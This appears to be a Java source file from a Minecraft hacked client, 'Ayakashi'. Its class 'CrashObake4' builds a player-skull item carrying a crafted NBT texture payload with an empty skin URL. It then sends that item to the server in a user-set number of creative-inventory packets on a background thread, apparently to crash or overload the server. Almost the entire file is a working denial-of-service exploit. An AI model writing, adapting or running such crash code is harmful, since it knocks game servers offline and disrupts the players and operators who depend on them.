package Ayakashi.methods.impl;

import Ayakashi.helpers.ChatHelper;
import Ayakashi.methods.Crash;
import Ayakashi.methods.CrashInfo;
import Ayakashi.mods.notifications.Notification;
import Ayakashi.mods.notifications.NotificationManager;
import Ayakashi.mods.notifications.NotificationType;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;

@CrashInfo(
        name = "obake4"
)
public class CrashObake4 extends Crash {
    public void execute(Object... args) {
        int packets = (Integer) args[0];
        long start = System.currentTimeMillis();
        NotificationManager.show(new Notification(NotificationType.INFO, ChatHelper.fix("&4Ayakashi"), "Obake method started!", 4));
        ChatHelper.sendMessage(String.format("Sending packets &8(&f%s&8) &8[&f%s&8]", this.getName().toUpperCase(), args[0]));

        (new Thread(() -> {
            try {
                final ItemStack item = new ItemStack(Items.skull, 1, 3);
                final NBTTagCompound base = new NBTTagCompound();
                base.setString("SkullOwner", "Aethereum404");
                final NBTTagCompound skullOwner = new NBTTagCompound();
                skullOwner.setString("Id", "6c3a735f433c4c5caae23211d7e7acdc");
                skullOwner.setString("Name", "Aethereum404");
                final NBTTagCompound display = new NBTTagCompound();
                display.setString("Name", "\ufffd4\"Gew\u00f6hnlicher\" \ufffd4Kopf");
                final NBTTagCompound properties = new NBTTagCompound();
                final NBTTagList textures = new NBTTagList();
                final NBTTagCompound tag = new NBTTagCompound();
                tag.setString("Signature", "TaTCfzX88SXppibQNMCnycgaVcySC05piL5OM1e8DPoMa0ptnof0hX/Wdd2rITpJQ4ZRqK/1UvHADIjimoWhl/14VMnoF8C3yCQQiy/ylLmgLFKWYoLlRHE7bXCPs/L2lCEjPdQ8sIuiHSQtcNrFNfBO76EcvmCfa89/qPtFcSrx+OOh3m4O7RABni9xoTtG8xSorLwad09r/AgKYyxLg6gx2iaT4UlFuIAQ3hp51e3oVvpm+l2UfvTdpPEjs8M5QJqGJ6Sq4aWp/0KIP9T1asotvWRTxsWOemuzImuSRC1Sz+Q5XbGKbBXPTKkCLVGoM9TtqtBtcul9JpgAMxy5NdpEQTxZ/moT4kn8VNjKVIaYb27Fg8RkilMtKNVR8j5JBirjY+fYoV5KpdswlqYgc0uXYGC16Q+UQB6DK2x4SuUK3D1eVSvu6mqR8MwymvYXMwvhVT2za3Lrfc/SrZPiQ8A8EbY33rmfzYcHZqvYAPKbY+ynJJOAW8c5U485tSku3iofFiBZoO1fQR/rOeQ/Vn8j7x7UR+93QvsivFOpcoTNqp9EqvMXIjP6I7vu8zbits6z6+Qp+88QEOzN6HttKP7x4j3KYOmrch5YzXPi/5m3N95hcOeQvgWdd8F5fNjtMcXniaZze2If/s3mc4BUBj+XJmtm+oiADuW3TDOlrTg=");
                tag.setString("Value", "eyJ0aW1lc3RhbXAiOjE1MTMxMTk1ODUzODgsInByZm9sZUlkIjoiNmMzYTczNWY0MzNjNGM1Y2FhZTIzMjExZDdlN2FjZGMiLCJwcm9maWxlTmFtZSI6IkFldGhlcmV1bTQwNCIsInNpZ25hdHVyZVJlcXVpcmVkIjpmYWxzZSwidGV4dHVyZXMiOnsiU0tJTiI6eyJ1cmwiOiIifX19=");
                item.setTagCompound(base);
                textures.appendTag(tag);
                properties.setTag("textures", textures);
                skullOwner.setTag("Properties", properties);
                base.setTag("SkullOwner", skullOwner);
                base.setTag("display", display);
                for (int i = 0; i < packets; ++i) {
                    Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(5, item));
                }
            } catch (Exception ignored) {
            }
        })).start();
        ChatHelper.sendMessage(String.format("Packets has been sent &8(&f%sms&8)", System.currentTimeMillis() - start));
    }
}
